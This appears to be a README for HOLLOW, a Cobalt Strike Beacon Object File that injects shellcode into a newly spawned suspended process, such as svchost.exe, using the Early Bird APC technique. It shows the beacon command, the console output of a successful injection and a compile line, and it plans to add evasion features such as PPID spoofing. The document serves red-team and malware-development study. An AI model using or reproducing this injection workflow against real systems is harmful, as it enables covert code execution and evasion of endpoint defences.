## HOLLOW - Cobalt Strike BOF
##### Authors:
+ Bobby Cooke ([@0xBoku](https://twitter.com/0xBoku))
+ Justin Hamilton ([@JTHam0](https://twitter.com/JTHam0))
+ Octavio Paguaga ([@OakTree__](https://twitter.com/OakTree__))
+ Matt Kingstone ([@n00bRage](https://twitter.com/n00bRage))

Beacon Object File (BOF) that spawns an arbitrary process from beacons memory in a suspended state, inject shellcode, hijack main thread with APC, and execute shellcode; using the Early Bird injection method taught by @SEKTOR7net in RED TEAM Operator: Malware Development Intermediate.
- [Sektor7 RED TEAM Operator: Malware Development Intermediate Course](https://institute.sektor7.net/courses/rto-maldev-intermediate/463257-code-injection/1435343-earlybird)

![](/images/poc.png)

### Run from Cobalt Strike Beacon Console
+ After compile import the hollow.cna script into Cobalt Strikes Script Manager
```bash
beacon> help hollow
Synopsis: hollow /path/to/hollow/pe /local/path/to/shellcode.bin
beacon> hollow svchost.exe /Users/bobby.cooke/popCalc.bin
[*] HOLLOW - EarlyBird Remote Process Shellcode Injector (@0xBoku|github.com/boku7) | (@JTHam0|github.com/Rodion0)
[*]             (@n00bRage|github.com/josephkingstone) | (@OakTree__|github.com/git-oaktree)
[*] Reading shellcode from: /Users/bobby.cooke/popCalc.bin
[+] Success - Spawned process for svchost.exe at 5464 (PID)
[+] Success - Allocated RE memory in remote process 5464 (PID) at: 0x000001A83BEC0000
[+] Success - Wrote 280 bytes to memory in remote process 5464 (PID) at 0x000001A83BEC0000
[+] Success - APC queued for main thread of 5464 (PID) to shellcode address 0x000001A83BEC0000
[+] Success - Your thread was resumed and your shellcode is being executed within the remote process!
```

### Compile with x64 MinGW (only tested from macOS):
```bash
x86_64-w64-mingw32-gcc -c hollow.x64.c -o hollow.o
```

### To Do List
+ Refactor code to make it more modular/clean
+ Implement this into github.com/boku7/SPAWN
  - Combine this with the PPID spoofing and blockdll features of SPAWN

### Credits / References
+ Credit/shoutout to: @SEKTOR7net + Raphael Mudge
##### Sektor7 Malware Dev Essentials course - learned how to do the early bird injection technique
+ https://institute.sektor7.net/red-team-operator-malware-development-essentials
##### Raphael Mudge - Beacon Object Files - Luser Demo
+ https://www.youtube.com/watch?v=gfYswA_Ronw
##### Cobalt Strike - Beacon Object Files
+ https://www.cobaltstrike.com/help-beacon-object-files
##### BOF Code References
+ https://github.com/odzhan/injection/blob/master/syscalls/inject_dll.c
+ https://github.com/ajpc500/BOFs/blob/main/SyscallsInject/entry.c
+ https://github.com/ajpc500/BOFs/blob/main/SyscallsInject/syscalls_inject.cna

